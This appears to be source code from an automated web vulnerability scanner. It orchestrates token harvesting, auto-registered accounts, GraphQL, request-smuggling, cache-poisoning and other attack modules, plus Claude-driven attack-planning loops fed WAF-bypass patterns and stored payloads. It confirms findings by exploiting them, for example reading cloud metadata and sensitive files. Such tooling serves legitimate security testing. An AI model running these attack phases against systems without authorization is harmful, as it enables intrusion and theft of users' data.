                for hdr_val in results["auth_headers"].values():
                    if "bearer" in str(hdr_val).lower() and not self.context.get("auth_cookie"):
                        self.context["auth_cookie"] = f"token={hdr_val.replace('Bearer ', '')}"
            if results.get("harvested_tokens"):
                self.context["harvested_tokens"] = results["harvested_tokens"]

            # Merge harvested IDs into context for IDOR/auth tests
            existing_ids = self.context.get("harvested_ids", {})
            for key, values in results.get("harvested_ids", {}).items():
                if key in existing_ids:
                    if isinstance(existing_ids[key], list):
                        existing_ids[key] = list(set(existing_ids[key] + list(values)))
                    else:
                        existing_ids[key] = list(values)
                else:
                    existing_ids[key] = list(values)
            self.context["harvested_ids"] = existing_ids

            # Merge newly discovered endpoints
            new_endpoints = results.get("authenticated_endpoints", [])
            if new_endpoints:
                existing = self.context.get("endpoints", [])
                existing_urls = {(ep.get("url") if isinstance(ep, dict) else ep) for ep in existing}
                for ep_url in new_endpoints:
                    if ep_url not in existing_urls:
                        existing.append({"url": ep_url, "type": "authenticated", "method": "GET"})
                self.context["endpoints"] = existing

            await self.log(db, "stateful_crawl",
                f"Stateful crawl: {forms_count} forms, {transitions_count} transitions, "
                f"{auth_endpoints} auth-only endpoints, {flows_count} multi-step flows, "
                f"{ids_count} harvested IDs")
        except Exception as e:
            await self.log(db, "stateful_crawl", f"Stateful crawl error (non-fatal): {e}", "error")

    async def _phase_auto_register(self, db: AsyncSession):
        """Auto-register a test account, obtain auth tokens for authenticated testing."""
        try:
            registrar = AutoRegister(self.context)
            result = await registrar.run()
            self.context["auto_register_result"] = result

            if result.get("authenticated"):
                # Propagate auth token to context for all downstream phases
                auth_header = result.get("auth_header")
                if auth_header and not self.context.get("auth_cookie"):
                    token = auth_header.replace("Bearer ", "")
                    self.context["auth_cookie"] = f"token={token}"
                    await self.log(db, "auto_register",
                        f"Authenticated as {result.get('test_email')} (role: {result.get('user_role', 'unknown')})")

                # Store user_id for IDOR testing
                if result.get("user_id"):
                    existing_ids = self.context.get("harvested_ids", {})
                    user_ids = existing_ids.get("user_id", [])
                    if result["user_id"] not in user_ids:
                        user_ids.append(result["user_id"])
                    existing_ids["user_id"] = user_ids
                    self.context["harvested_ids"] = existing_ids

                # Store JS-extracted endpoints for IDOR/exploit phases
                js_eps = self.context.get("js_api_endpoints", [])
                for ep in (self.context.get("endpoints") or []):
                    url = ep.get("url", "") if isinstance(ep, dict) else str(ep)
                    if url and url not in js_eps:
                        js_eps.append(url)
                self.context["js_api_endpoints"] = js_eps

            # Save findings from auto_register (e.g., no email verification, user enumeration)
            findings = result.get("findings", [])
            if findings:
                scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
                scan = scan_result.scalar_one_or_none()
                sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                           "medium": Severity.MEDIUM, "low": Severity.LOW}
                saved = 0
                for f in findings:
                    vtype = VULN_TYPE_ALIASES.get(f.get("vuln_type", ""), VulnType.MISCONFIGURATION)
                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=str(f.get("title", "Auth issue"))[:500],
                        vuln_type=vtype,
                        severity=sev_map.get(f.get("severity", "medium"), Severity.MEDIUM),
                        url=str(f.get("url", ""))[:2000],
                        method=f.get("method"),
                        description=str(f.get("description", "")),
                        impact=str(f.get("impact", "")),
                        remediation=str(f.get("remediation", "")),
                        ai_confidence=f.get("ai_confidence", 0.8),
                        request_data=f.get("request_data"),
                        response_data=f.get("response_data"),
                    )
                    r = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                    if r:
                        saved += 1
                await self.log(db, "auto_register",
                    f"Auto-register: {saved} auth findings saved", "warning")

            status = "authenticated" if result.get("authenticated") else (
                "registered" if result.get("registered") else "no registration endpoint found")
            await self.log(db, "auto_register", f"Auto-register status: {status}")
        except Exception as e:
            await self.log(db, "auto_register", f"Auto-register error (non-fatal): {e}", "error")

    async def _phase_graphql_attacks(self, db: AsyncSession):
        """Deep GraphQL security testing — introspection, injection, DoS, authz bypass."""
        if self.context.get("stealth"):
            await self.log(db, "graphql_attacks", "Skipped in stealth mode")
            return

        try:
            mod = GraphQLAttackModule(self.context)
            findings = await mod.run(self.context)

            if findings:
                findings = await self._filter_false_positives(findings, db, "graphql_attacks")

            if findings:
                scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
                scan = scan_result.scalar_one_or_none()

                sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                           "medium": Severity.MEDIUM, "low": Severity.LOW}
                saved = 0
                for f in findings:
                    # Map vuln_type based on finding title
                    title_lower = f.get("title", "").lower()
                    if "injection" in title_lower or "sqli" in title_lower or "nosql" in title_lower:
                        vtype = VulnType.SQLI
                    elif "authorization" in title_lower or "bypass" in title_lower:
                        vtype = VulnType.AUTH_BYPASS
                    elif "information" in title_lower or "disclosure" in title_lower or "suggestion" in title_lower:
                        vtype = VulnType.INFO_DISCLOSURE
                    else:
                        vtype = VulnType.MISCONFIGURATION

                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f.get("title", "GraphQL issue")[:500],
                        vuln_type=vtype,
                        severity=sev_map.get(f.get("severity", "medium"), Severity.MEDIUM),
                        url=f.get("url", "")[:2000],
                        parameter=f.get("parameter"),
                        description=f.get("description", ""),
                        impact=f.get("impact", ""),
                        remediation=f.get("remediation", ""),
                        payload_used=f.get("payload_used"),
                        request_data=f.get("request_data"),
                        response_data=f.get("response_data"),
                        ai_confidence=f.get("ai_confidence", 0.7),
                    )
                    result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                    if result:
                        saved += 1

                await self.log(db, "graphql_attacks",
                    f"GraphQL attack testing: {saved} new issues ({len(findings) - saved} deduped)", "warning")
            else:
                await self.log(db, "graphql_attacks", "No GraphQL vulnerabilities found")
        except Exception as e:
            await self.log(db, "graphql_attacks", f"GraphQL attack testing error (non-fatal): {e}", "error")

    async def _phase_business_logic(self, db: AsyncSession):
        """Test for business logic vulnerabilities."""
        if self.context.get("stealth"):
            await self.log(db, "business_logic", "Skipped in stealth mode")
            return

        try:
            tester = BusinessLogicTester(self.context)
            findings = await tester.test()

            if findings:
                findings = await self._filter_false_positives(findings, db, "business_logic")

            if findings:
                scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
                scan = scan_result.scalar_one_or_none()

                sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                           "medium": Severity.MEDIUM, "low": Severity.LOW}

                # Pre-save conceptual dedup: group by normalized title, keep max 3 per concept
                seen_biz_logic: dict[str, int] = defaultdict(int)
                deduped_findings = []
                for f in findings:
                    title = f.get("title", "Business logic issue")
                    concept_key = self._normalize_biz_logic_title(title) or title
                    if seen_biz_logic[concept_key] >= 3:
                        continue  # Already have 3 findings for this concept
                    seen_biz_logic[concept_key] += 1
                    deduped_findings.append(f)

                concept_skipped = len(findings) - len(deduped_findings)

                saved = 0
                for f in deduped_findings:
                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f.get("title", "Business logic issue")[:500],
                        vuln_type=VulnType.BUSINESS_LOGIC,
                        severity=sev_map.get(f.get("severity", "medium"), Severity.MEDIUM),
                        url=f.get("url", "")[:2000],
                        parameter=f.get("parameter"),
                        method=f.get("method"),
                        description=f.get("description", ""),
                        impact=f.get("impact", ""),
                        remediation=f.get("remediation", ""),
                        payload_used=f.get("payload_used"),
                        request_data=f.get("request_data"),
                        response_data=f.get("response_data"),
                        ai_confidence=f.get("ai_confidence", 0.7),
                    )
                    result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                    if result:
                        saved += 1

                total_deduped = len(findings) - saved
                await self.log(db, "business_logic",
                    f"Business logic testing: {saved} new issues ({total_deduped} deduped, {concept_skipped} concept-grouped)", "warning")
            else:
                await self.log(db, "business_logic", "No business logic vulnerabilities found")
        except Exception as e:
            await self.log(db, "business_logic", f"Business logic testing error (non-fatal): {e}", "error")

    async def _phase_request_smuggling(self, db: AsyncSession):
        """Test for HTTP Request Smuggling (CL.TE, TE.CL, TE.TE)."""
        if self.context.get("stealth"):
            await self.log(db, "request_smuggling", "Skipped in stealth mode")
            return

        try:
            sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
            mod = RequestSmugglingModule(rate_limit=sem)
            findings = await mod.run(self.context)

            if findings:
                findings = await self._filter_false_positives(findings, db, "request_smuggling")

            if findings:
                scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
                scan = scan_result.scalar_one_or_none()
                sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                           "medium": Severity.MEDIUM, "low": Severity.LOW}
                vt_map = {v.value: v for v in VulnType}

                saved = 0
                for f in findings:
                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f.get("title", "HTTP Request Smuggling")[:500],
                        vuln_type=vt_map.get(f.get("vuln_type", "misconfiguration"), VulnType.MISCONFIGURATION),
                        severity=sev_map.get(f.get("severity", "high"), Severity.HIGH),
                        url=f.get("url", "")[:2000],
                        method=f.get("method"),
                        description=f.get("description", ""),
                        impact=f.get("impact", ""),
                        remediation=f.get("remediation", ""),
                        payload_used=f.get("payload"),
                        request_data=f.get("request_data"),
                        response_data=f.get("response_data", {"proof": f.get("proof", "")}),
                        ai_confidence=0.85,
                    )
                    result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                    if result:
                        saved += 1

                await self.log(db, "request_smuggling",
                    f"Request smuggling: {saved} new vulnerabilities ({len(findings) - saved} deduped)", "warning")
            else:
                await self.log(db, "request_smuggling", "No request smuggling vulnerabilities found")
        except Exception as e:
            await self.log(db, "request_smuggling", f"Request smuggling testing error (non-fatal): {e}", "error")

    async def _phase_mass_assignment(self, db: AsyncSession):
        """Test for Mass Assignment / Parameter Pollution vulnerabilities."""
        if self.context.get("stealth"):
            await self.log(db, "mass_assignment", "Skipped in stealth mode")
            return

        try:
            sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
            mod = MassAssignmentModule(rate_limit=sem)
            findings = await mod.run(self.context)

            if findings:
                findings = await self._filter_false_positives(findings, db, "mass_assignment")

            if findings:
                scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
                scan = scan_result.scalar_one_or_none()
                sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                           "medium": Severity.MEDIUM, "low": Severity.LOW}
                vt_map = {v.value: v for v in VulnType}

                saved = 0
                for f in findings:
                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f.get("title", "Mass Assignment")[:500],
                        vuln_type=vt_map.get(f.get("vuln_type", "misconfiguration"), VulnType.MISCONFIGURATION),
                        severity=sev_map.get(f.get("severity", "high"), Severity.HIGH),
                        url=f.get("url", "")[:2000],
                        method=f.get("method"),
                        description=f.get("description", ""),
                        impact=f.get("impact", ""),
                        remediation=f.get("remediation", ""),
                        payload_used=f.get("payload"),
                        request_data=f.get("request_data"),
                        response_data=f.get("response_data", {"proof": f.get("proof", "")}),
                        ai_confidence=0.8,
                    )
                    result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                    if result:
                        saved += 1

                await self.log(db, "mass_assignment",
                    f"Mass assignment: {saved} new vulnerabilities ({len(findings) - saved} deduped)", "warning")
            else:
                await self.log(db, "mass_assignment", "No mass assignment vulnerabilities found")
        except Exception as e:
            await self.log(db, "mass_assignment", f"Mass assignment testing error (non-fatal): {e}", "error")

    async def _phase_cache_poisoning(self, db: AsyncSession):
        """Test for Web Cache Poisoning and Cache Deception."""
        if self.context.get("stealth"):
            await self.log(db, "cache_poisoning", "Skipped in stealth mode")
            return

        try:
            sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
            mod = CachePoisoningModule(rate_limit=sem)
            findings = await mod.run(self.context)

            if findings:
                findings = await self._filter_false_positives(findings, db, "cache_poisoning")

            if findings:
                scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
                scan = scan_result.scalar_one_or_none()
                sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                           "medium": Severity.MEDIUM, "low": Severity.LOW}
                vt_map = {v.value: v for v in VulnType}

                saved = 0
                for f in findings:
                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f.get("title", "Cache Poisoning")[:500],
                        vuln_type=vt_map.get(f.get("vuln_type", "misconfiguration"), VulnType.MISCONFIGURATION),
                        severity=sev_map.get(f.get("severity", "medium"), Severity.MEDIUM),
                        url=f.get("url", "")[:2000],
                        method=f.get("method"),
                        description=f.get("description", ""),
                        impact=f.get("impact", ""),
                        remediation=f.get("remediation", ""),
                        payload_used=f.get("payload"),
                        request_data=f.get("request_data"),
                        response_data=f.get("response_data", {"proof": f.get("proof", "")}),
                        ai_confidence=0.75,
                    )
                    result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                    if result:
                        saved += 1

                await self.log(db, "cache_poisoning",
                    f"Cache poisoning: {saved} new vulnerabilities ({len(findings) - saved} deduped)", "warning")
            else:
                await self.log(db, "cache_poisoning", "No cache poisoning vulnerabilities found")
        except Exception as e:
            await self.log(db, "cache_poisoning", f"Cache poisoning testing error (non-fatal): {e}", "error")

    async def _phase_stress_test(self, db: AsyncSession):
        """Test resilience — rate limiting, slow connections, large payloads."""
        if self.context.get("stealth"):
            await self.log(db, "stress_test", "Skipped in stealth mode")
            return

        sem = asyncio.Semaphore(self.context.get("rate_limit") or 20)
        mod = StressTestModule(rate_limit=sem)
        findings = await mod.run(self.context)
        # Filter out known false positives
        if findings:
            findings = await self._filter_false_positives(findings, db, "stress_test")
        if findings:
            scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
            scan = scan_result.scalar_one_or_none()
            vt_map = {v.value: v for v in VulnType}
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                       "medium": Severity.MEDIUM, "low": Severity.LOW}

            saved = 0
            for f in findings:
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f.get("title", "Resilience issue")[:500],
                    vuln_type=vt_map.get(f.get("vuln_type", "misconfiguration"), VulnType.MISCONFIGURATION),
                    severity=sev_map.get(f.get("severity", "low"), Severity.LOW),
                    url=f.get("url", "")[:2000],
                    method=f.get("method"),
                    description=f.get("impact", ""),
                    payload_used=f.get("payload"),
                    remediation=f.get("remediation"),
                    ai_confidence=0.85,
                    request_data=f.get("request_data"),
                    response_data=f.get("response_data"),
                )
                result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                if result:
                    saved += 1

            await self.log(db, "stress_test",
                f"Resilience testing found {saved} new issues ({len(findings) - saved} deduped)", "warning")
        else:
            await self.log(db, "stress_test", "Server passed resilience tests")

    async def _phase_claude_collab(self, db: AsyncSession):
        """Claude collaboration: iterative deep analysis with Claude API."""
        from app.ai.get_claude_key import get_claude_api_key
        if not get_claude_api_key():
            await self.log(db, "claude_collab", "Skipped: no Anthropic API key configured")
            return

        from app.ai.claude_collab import ClaudeCollaboration

        collab = ClaudeCollaboration()
        await self.log(db, "claude_collab",
            f"Starting Claude collaboration on {self.context['domain']}...")

        # RAG: Inject knowledge base context for Claude collaboration
        try:
            from app.core.knowledge import KnowledgeBase
            from app.models.knowledge import KnowledgePattern

            kb = KnowledgeBase()
            techs = list((self.context.get("technologies") or {}).get("summary", {}).keys())
            rag_parts = []

            # WAF bypass patterns from KB
            waf_info = self.context.get("waf_info") or {}
            if waf_info.get("detected"):
                waf_name = waf_info.get("waf_name", "unknown")
                waf_patterns = await db.execute(
                    select(KnowledgePattern).where(
                        and_(
                            KnowledgePattern.pattern_type == "waf_bypass",
                            KnowledgePattern.confidence > 0.3,
                        )
                    ).order_by(KnowledgePattern.confidence.desc()).limit(5)
                )
                waf_results = waf_patterns.scalars().all()
                if waf_results:
                    rag_parts.append(f"WAF BYPASS PATTERNS FROM KNOWLEDGE BASE (WAF: {waf_name}):")
                    for wp in waf_results:
                        d = wp.pattern_data or {}
                        rag_parts.append(f"  - {d.get('technique', wp.vuln_type or '?')}: {d.get('payload', d.get('description', ''))[:100]}")

            # Effective payloads for detected vuln types
            vuln_types = set()
            for v in self.context.get("vulnerabilities", []):
                vt = v.get("vuln_type", "")
                if vt:
                    vuln_types.add(vt)
            for vt in list(vuln_types)[:3]:
                payloads = await kb.get_effective_payloads(db, vt)
                if payloads:
                    rag_parts.append(f"EFFECTIVE PAYLOADS for {vt} from past scans:")
                    for p in payloads[:3]:
                        rag_parts.append(f"  - {p['payload'][:80]} (confidence: {p['confidence']:.0%})")

            # Tech-vuln correlations
            if techs:
                insights = await kb.get_tech_vuln_insights(db, techs)
                recs = insights.get("recommendations", [])[:5]
                if recs:
                    rag_parts.append("HISTORICAL VULN PATTERNS for this tech stack:")
                    for r in recs:
                        rag_parts.append(f"  - {r['vuln_type']}: {r['success_rate']:.0%} success rate on {r['technology']}")

            # H1 insights — what bounty platforms reward
            h1_insights = await kb.get_h1_insights(db)
            if h1_insights:
                rag_parts.append("H1 INSIGHTS — What bounty platforms accept/reward:")
                for h in h1_insights[:5]:
                    line = f"  - {h['vuln_type']}: {h.get('insight', h.get('recommendation', ''))}"
                    if h.get("bounty_range"):
                        line += f" (bounty: {h['bounty_range']})"
                    rag_parts.append(line)

            if rag_parts:
                self.context["_rag_context"] = "\nKNOWLEDGE BASE INTELLIGENCE:\n" + "\n".join(rag_parts) + "\n"
        except Exception as e:
            logger.debug(f"RAG injection for claude_collab failed (non-fatal): {e}")

        # WebSocket callback for live Claude events
        async def on_claude_event(event: dict):
            await self._publish({
                "type": "claude_collab_event",
                **event,
            })

        # Load ALL vulns found so far from DB (not just exploit phase context)
        try:
            vuln_rows = (await db.execute(
                select(Vulnerability).where(Vulnerability.scan_id == self.scan_id)
            )).scalars().all()
            if vuln_rows:
                self.context["vulnerabilities"] = [
                    {
                        "vuln_type": v.vuln_type.value if v.vuln_type else "",
                        "severity": v.severity.value if v.severity else "",
                        "url": v.url or "",
                        "title": v.title or "",
                        "parameter": v.parameter or "",
                        "payload_used": v.payload_used or "",
                    }
                    for v in vuln_rows
                ]
                await self.log(db, "claude_collab",
                    f"Loaded {len(vuln_rows)} vulns from DB for Claude context")
        except Exception as e:
            logger.warning(f"Failed to load vulns for Claude context: {e}")

        result = await collab.start_analysis(self.context, on_event=on_claude_event)

        rounds = result.get("rounds", 0)
        findings = result.get("findings", [])
        actions = result.get("actions_taken", 0)
        action_evidence = result.get("action_evidence", {})

        if result.get("error"):
            await self.log(db, "claude_collab",
                f"Claude collab error: {result['error']} ({rounds} rounds completed)",
                "warning")

        await self.log(db, "claude_collab",
            f"Claude collab: {rounds} rounds, {actions} actions, "
            f"{len(findings)} additional findings",
            "success" if findings else "info")

        # Mapping helpers for Claude finding fields → our enums
        _SEVERITY_MAP = {v.value: v for v in Severity}

        # Add any new findings from Claude collaboration
        if findings:
            # Load the scan object for counter updates
            scan_result = await db.execute(
                select(Scan).where(Scan.id == self.context["scan_id"])
            )
            scan = scan_result.scalar_one_or_none()

            for f in findings:
                # Keep existing logging
                await self.log(db, "claude_collab",
                    f"Claude found: {json.dumps(f, default=str)[:500]}",
                    "warning")

                # --- Map vuln_type ---
                raw_type = str(f.get("type", f.get("vuln_type", ""))).lower().strip().replace(" ", "_").replace("-", "_")
                vuln_type = VULN_TYPE_ALIASES.get(raw_type, VulnType.INFO_DISCLOSURE)

                # --- Map severity ---
                raw_sev = str(f.get("severity", "medium")).lower().strip()
                severity = _SEVERITY_MAP.get(raw_sev, Severity.MEDIUM)

                # --- Build the URL ---
                url = f.get("url", self.context.get("base_url", ""))

                # --- Title & description ---
                title = f.get("title", f.get("name", f"Claude finding: {vuln_type.value}"))
                description = f.get("description", f.get("details", json.dumps(f, default=str)[:2000]))

                # Attach action evidence (request/response proof) if available
                request_data, response_data = collab._get_evidence_for_finding(f)

                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=title[:500],
                    vuln_type=vuln_type,
                    severity=severity,
                    url=url[:2000],
                    parameter=f.get("parameter", f.get("param")),
                    method=f.get("method"),
                    description=description,
                    impact=f.get("impact"),
                    remediation=f.get("remediation", f.get("fix")),
                    payload_used=f.get("payload"),
                    request_data=request_data,
                    response_data=response_data,
                    ai_confidence=0.7,
                    ai_analysis=json.dumps(f, default=str),
                )
                finding_dict = {
                    "vuln_type": vuln_type.value,
                    "severity": severity.value,
                    "url": url,
                    "title": title,
                    "source": "claude_collab",
                }
                saved = await self._save_vuln_deduped(
                    db, vuln, scan=scan, track_context=True, finding_dict=finding_dict,
                )
                if saved:
                    finding_dict["id"] = saved.id

                # Publish WebSocket event per finding
                await self._publish({
                    "type": "new_vuln",
                    "source": "claude_collab",
                    "vuln_id": vuln.id,
                    "vuln_type": vuln_type.value,
                    "severity": severity.value,
                    "title": title,
                    "url": url,
                })

    async def _phase_attack_planner(self, db: AsyncSession):
        """AI Attack Planner: Claude-as-Brain reasoning loop for chained attacks."""
        from app.ai.get_claude_key import get_claude_api_key
        if not get_claude_api_key():
            await self.log(db, "attack_planner", "Skipped: no Anthropic API key configured")
            return

        planner = AttackPlanner()
        await self.log(db, "attack_planner",
            f"Starting AI Attack Planner on {self.context['domain']}...")

        # Load ALL vulns from DB for full context
        try:
            vuln_rows = (await db.execute(
                select(Vulnerability).where(Vulnerability.scan_id == self.scan_id)
            )).scalars().all()
            if vuln_rows:
                self.context["vulnerabilities"] = [
                    {
                        "vuln_type": v.vuln_type.value if v.vuln_type else "",
                        "severity": v.severity.value if v.severity else "",
                        "url": v.url or "",
                        "title": v.title or "",
                        "parameter": v.parameter or "",
                        "payload_used": v.payload_used or "",
                        "description": (v.description or "")[:200],
                    }
                    for v in vuln_rows
                ]
        except Exception as e:
            logger.warning(f"Failed to load vulns for Attack Planner: {e}")

        # Inject RAG context if not already present
        if not self.context.get("_rag_context"):
            try:
                from app.core.knowledge import KnowledgeBase
                kb = KnowledgeBase()
                techs = list((self.context.get("technologies") or {}).get("summary", {}).keys())
                rag_parts = []
                for vt_value in set(v.get("vuln_type", "") for v in self.context.get("vulnerabilities", []))[:3]:
                    if vt_value:
                        payloads = await kb.get_effective_payloads(db, vt_value)
                        if payloads:
                            rag_parts.append(f"Effective {vt_value} payloads: " + ", ".join(p["payload"][:60] for p in payloads[:3]))
                if rag_parts:
                    self.context["_rag_context"] = "\nKB INTELLIGENCE:\n" + "\n".join(rag_parts) + "\n"
            except Exception:
                pass

        # Inject Knowledge Graph context for exploit chain intelligence
        try:
            from app.core.knowledge_graph import KnowledgeGraph
            technologies = list((self.context.get("technologies") or {}).get("summary", {}).keys())
            if technologies:
                graph_intel = await KnowledgeGraph.query_attack_surface(db, technologies)
                similar = await KnowledgeGraph.find_similar_targets(
                    db, self.context.get("domain", ""), technologies
                )
                self.context["graph_attack_surface"] = graph_intel
                self.context["graph_similar_targets"] = similar
                logger.info(
                    f"Graph intel injected: {len(graph_intel.get('vulnerabilities', []))} vulns, "
                    f"{len(graph_intel.get('techniques', []))} techniques, "
                    f"{len(similar)} similar targets"
                )
        except Exception as e:
            logger.warning(f"Knowledge Graph query failed (non-fatal): {e}")

        # WebSocket callback
        async def on_planner_event(event: dict):
            await self._publish({"type": "attack_planner_event", **event})

        result = await planner.run(self.context, on_event=on_planner_event)

        rounds = result.get("rounds", 0)
        findings = result.get("findings", [])
        actions = result.get("actions_executed", 0)
        reflector_uses = result.get("reflector_uses", 0)
        monitor_triggers = result.get("monitor_triggers", 0)

        if result.get("error"):
            await self.log(db, "attack_planner",
                f"Attack Planner error: {result['error']} ({rounds} rounds)", "warning")

        stats = f"Attack Planner: {rounds} rounds, {actions} actions, {len(findings)} findings"
        if reflector_uses:
            stats += f", {reflector_uses} reflections"
        if monitor_triggers:
            stats += f", {monitor_triggers} pivots"
        await self.log(db, "attack_planner", stats,
            "success" if findings else "info")

        # Save findings as Vulnerability records
        if findings:
            scan_result = await db.execute(
                select(Scan).where(Scan.id == self.context["scan_id"])
            )
            scan = scan_result.scalar_one_or_none()

            _SEVERITY_MAP = {v.value: v for v in Severity}

            for f in findings:
                raw_type = str(f.get("vuln_type", "")).lower().strip().replace(" ", "_").replace("-", "_")
                vuln_type = VULN_TYPE_ALIASES.get(raw_type, VulnType.INFO_DISCLOSURE)

                raw_sev = str(f.get("severity", "medium")).lower().strip()
                severity = _SEVERITY_MAP.get(raw_sev, Severity.MEDIUM)

                title = f.get("title", f"Attack Planner: {vuln_type.value}")
                description = f.get("description", "")
                chain_info = f.get("chain", "")
                if chain_info:
                    description = f"{description}\n\nAttack Chain: {chain_info}"

                # Set confidence based on whether proof is concrete
                proof = f.get("proof", "")
                has_concrete_proof = bool(proof and len(str(proof)) > 30
                    and not any(w in str(proof).lower() for w in ("possible", "might", "could be", "appears")))
                confidence = 0.75 if has_concrete_proof else 0.5

                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f"[AI Planner] {title}"[:500],
                    vuln_type=vuln_type,
                    severity=severity,
                    url=(f.get("url") or self.context.get("base_url", ""))[:2000],
                    parameter=f.get("parameter"),
                    description=description,
                    impact=f.get("impact"),
                    remediation=f.get("remediation"),
                    payload_used=f.get("payload"),
                    ai_confidence=confidence,
                    ai_analysis=json.dumps(f, default=str),
                    response_data={"proof": proof} if proof else None,
                )

                saved = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict={
                    "vuln_type": vuln_type.value,
                    "severity": severity.value,
                    "url": vuln.url,
                    "title": title,
                    "source": "attack_planner",
                })

                if saved:
                    await self._publish({
                        "type": "new_vuln",
                        "source": "attack_planner",
                        "vuln_id": saved.id,
                        "vuln_type": vuln_type.value,
                        "severity": severity.value,
                        "title": title,
                    })

    async def _phase_vuln_confirm(self, db: AsyncSession):
        """Confirm all detected vulnerabilities by attempting actual exploitation.

        For each vuln found so far, tries to PROVE it works:
        - SQLi: extract data (already handled by DeepSQLi in exploiter)
        - XSS: verify reflection in executable context
        - SSRF: read cloud metadata / internal files
        - SSTI: execute template expressions
        - CMD Injection: execute unique commands
        - LFI: read sensitive files
        - IDOR: access multiple users' data
        """


        # Get all vulns for this scan that haven't been confirmed yet
        result = await db.execute(
            select(Vulnerability).where(Vulnerability.scan_id == self.scan_id)
        )
        vulns = result.scalars().all()

        if not vulns:
            await self.log(db, "vuln_confirm", "No vulnerabilities to confirm")
            return

        # Filter out already-confirmed ones
        unconfirmed = [
            v for v in vulns
            if not (v.response_data or {}).get("confirmation", {}).get("confirmed")
            and not (v.response_data or {}).get("deep_sqli")  # SQLi already confirmed by DeepSQLi
        ]

        if not unconfirmed:
            await self.log(db, "vuln_confirm",
                f"All {len(vulns)} vulnerabilities already confirmed or have exploitation data")
            return

        await self.log(db, "vuln_confirm",
            f"Confirming {len(unconfirmed)}/{len(vulns)} vulnerabilities by exploitation...")

        confirmer = VulnConfirmer()
        stats = await confirmer.confirm_all(unconfirmed, self.context, db)

        await self.log(db, "vuln_confirm",
            f"Confirmation results: {stats['confirmed']} confirmed, "
            f"{stats['failed']} unconfirmed, {stats['escalated']} severity escalated "
            f"(of {stats['total']} tested)",
            "success" if stats["confirmed"] > 0 else "info")

        await db.commit()

    async def _phase_evidence(self, db: AsyncSession):
        # Run legacy attack chain analysis (supplements chains from exploit phase)
        try:
            from app.modules.attack_chain import AttackChainModule
            chain_mod = AttackChainModule()
            chains = await chain_mod.analyze(self.context)
            if chains:
                # Merge with chains from exploit phase (don't overwrite)
                existing = self.context.get("attack_chains", [])
                existing_names = {c.get("chain_name") or c.get("template_id") for c in existing}
                new_chains = [c for c in chains if c.get("chain_name") not in existing_names]
                if new_chains:
                    existing.extend(new_chains)
                    self.context["attack_chains"] = existing
                    await self.log(db, "evidence",
                        f"Additional chain analysis: {len(new_chains)} new chains: "
                        + ", ".join(c["chain_name"] for c in new_chains[:5]),
                        "warning")
        except Exception as e:
            await self.log(db, "evidence", f"Chain analysis error: {e}", "error")

        collector = EvidenceCollector()
        evidence = await collector.collect(self.context)
        self.context["evidence"] = evidence
        await self.log(db, "evidence", f"Collected evidence for {len(evidence)} findings")

    async def _phase_report(self, db: AsyncSession):
        reporter = ReportGenerator()
        for vuln in self.context.get("vulnerabilities", []):
            vuln["target_id"] = self.context["target_id"]
            vuln["scan_id"] = self.context["scan_id"]
            await reporter.generate_for_vuln(vuln, db)
        await self.log(db, "report", "Reports generated for all findings")

    async def _notify_critical_vulns(self, db: AsyncSession, target):
        """Send notifications for critical/high severity vulnerabilities found in this scan."""
        try:
            from app.core.notifications import notify_critical_vuln, get_notification_settings

            settings = get_notification_settings()
            if not settings.get("enabled_channels"):
                return

            result = await db.execute(
                select(Vulnerability).where(
                    Vulnerability.scan_id == self.scan_id,
                    Vulnerability.severity.in_([Severity.CRITICAL, Severity.HIGH]),
                )
            )
            critical_vulns = result.scalars().all()
            for vuln in critical_vulns:
                if vuln.severity == Severity.CRITICAL and settings.get("notify_critical", True):
                    notify_critical_vuln(vuln, target)
                elif vuln.severity == Severity.HIGH and settings.get("notify_high", True):
                    notify_critical_vuln(vuln, target)
        except Exception as e:
            logger.debug(f"Critical vuln notification failed: {e}")

    async def _get_knowledge_payloads(self, db: AsyncSession) -> list:
        """Query the knowledge base for effective payloads matching the target's technologies."""
        from app.models.knowledge import KnowledgePattern

        techs = list(self.context.get("technologies", {}).keys())
        payloads = []

        # Get effective payloads (high confidence, proven)
